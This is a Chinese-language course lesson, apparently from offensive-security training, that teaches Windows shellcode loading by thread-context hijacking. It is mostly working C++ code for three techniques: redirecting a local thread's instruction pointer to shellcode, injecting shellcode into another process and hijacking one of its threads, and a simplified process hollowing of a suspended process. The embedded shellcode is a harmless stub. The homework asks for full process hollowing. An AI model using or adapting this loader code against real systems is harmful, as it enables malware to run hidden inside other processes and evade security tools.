# 课时09 - C++线程上下文实现ShellCode Loader

## 课程目标
1. 理解线程上下文（CONTEXT）结构
2. 掌握GetThreadContext/SetThreadContext的使用
3. 实现通过修改线程上下文执行ShellCode
4. 了解线程劫持技术

## 名词解释

| 术语 | 全称 | 解释 |
|------|------|------|
| CONTEXT | - | 线程上下文结构，包含寄存器状态 |
| EIP/RIP | Instruction Pointer | 指令指针寄存器 |
| GetThreadContext | - | 获取线程上下文 |
| SetThreadContext | - | 设置线程上下文 |
| Thread Hijacking | 线程劫持 | 修改线程执行流程 |

## 代码实现

```cpp
// context_loader.cpp
// 线程上下文方式执行ShellCode

#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90,
    0x31, 0xC0, 0x40, 0xC3
};

// 方法1: 劫持自身新建线程
DWORD WINAPI DummyThread(LPVOID param) {
    // 无限循环，等待被劫持
    while (TRUE) {
        Sleep(100);
    }
    return 0;
}

void Method1_HijackNewThread() {
    printf("[*] Method 1: Hijack New Thread\n");
    
    // 分配可执行内存
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!mem) return;
    
    memcpy(mem, shellcode, sizeof(shellcode));
    
    // 创建线程
    HANDLE hThread = CreateThread(NULL, 0, DummyThread, NULL, 0, NULL);
    if (!hThread) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return;
    }
    
    // 等待线程启动
    Sleep(50);
    
    // 挂起线程
    SuspendThread(hThread);
    printf("[+] Thread suspended\n");
    
    // 获取线程上下文
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(hThread, &ctx)) {
        printf("[-] GetThreadContext failed\n");
        ResumeThread(hThread);
        TerminateThread(hThread, 0);
        CloseHandle(hThread);
        return;
    }
    
    #ifdef _WIN64
    printf("[+] Original RIP: 0x%llX\n", ctx.Rip);
    ctx.Rip = (DWORD64)mem;
    printf("[+] New RIP: 0x%llX\n", ctx.Rip);
    #else
    printf("[+] Original EIP: 0x%lX\n", ctx.Eip);
    ctx.Eip = (DWORD)mem;
    printf("[+] New EIP: 0x%lX\n", ctx.Eip);
    #endif
    
    // 设置新上下文
    if (!SetThreadContext(hThread, &ctx)) {
        printf("[-] SetThreadContext failed\n");
        ResumeThread(hThread);
        TerminateThread(hThread, 0);
        CloseHandle(hThread);
        return;
    }
    
    printf("[+] Context modified\n");
    
    // 恢复执行
    ResumeThread(hThread);
    printf("[+] Thread resumed\n");
    
    // 等待执行完成
    WaitForSingleObject(hThread, 1000);
    
    TerminateThread(hThread, 0);
    CloseHandle(hThread);
    VirtualFree(mem, 0, MEM_RELEASE);
}

// 方法2: 远程进程线程劫持
BOOL HijackRemoteThread(DWORD pid, DWORD tid, const void* code, SIZE_T size) {
    printf("[*] Method 2: Remote Thread Hijack (PID=%lu, TID=%lu)\n", pid, tid);
    
    // 打开进程
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        FALSE, pid);
    
    if (!hProcess) {
        printf("[-] OpenProcess failed\n");
        return FALSE;
    }
    
    // 打开线程
    HANDLE hThread = OpenThread(
        THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
        FALSE, tid);
    
    if (!hThread) {
        printf("[-] OpenThread failed\n");
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 分配远程内存
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!remoteMem) {
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("[+] Remote memory: %p\n", remoteMem);
    
    // 写入ShellCode
    SIZE_T written;
    WriteProcessMemory(hProcess, remoteMem, code, size, &written);
    
    // 挂起线程
    SuspendThread(hThread);
    
    // 获取上下文
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
    
    #ifdef _WIN64
    printf("[+] Original RIP: 0x%llX\n", ctx.Rip);
    ctx.Rip = (DWORD64)remoteMem;
    #else
    printf("[+] Original EIP: 0x%lX\n", ctx.Eip);
    ctx.Eip = (DWORD)remoteMem;
    #endif
    
    // 设置上下文
    SetThreadContext(hThread, &ctx);
    
    // 恢复
    ResumeThread(hThread);
    printf("[+] Thread hijacked and resumed\n");
    
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return TRUE;
}

// 方法3: 使用挂起创建的进程
BOOL ProcessHollowingLight(const wchar_t* targetExe) {
    printf("[*] Method 3: Process Hollowing Light\n");
    
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // 挂起创建
    if (!CreateProcessW(targetExe, NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess failed\n");
        return FALSE;
    }
    
    printf("[+] Process created: %lu\n", pi.dwProcessId);
    
    // 分配内存
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    SIZE_T written;
    WriteProcessMemory(pi.hProcess, remoteMem, shellcode, sizeof(shellcode), &written);
    
    // 修改主线程上下文
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    #ifdef _WIN64
    ctx.Rip = (DWORD64)remoteMem;
    #else
    ctx.Eax = (DWORD)remoteMem;  // 或直接修改EIP
    #endif
    
    SetThreadContext(pi.hThread, &ctx);
    
    // 恢复
    ResumeThread(pi.hThread);
    
    printf("[+] Process resumed with modified context\n");
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return TRUE;
}

int main() {
    printf("========================================\n");
    printf("     Thread Context Loader             \n");
    printf("========================================\n\n");
    
    Method1_HijackNewThread();
    
    return 0;
}
```

## 课后作业

### 作业1：实现完整的进程镂空
实现完整的Process Hollowing技术。

### 作业2：保存和恢复原始执行流
在ShellCode执行完后，恢复原始的执行流程。
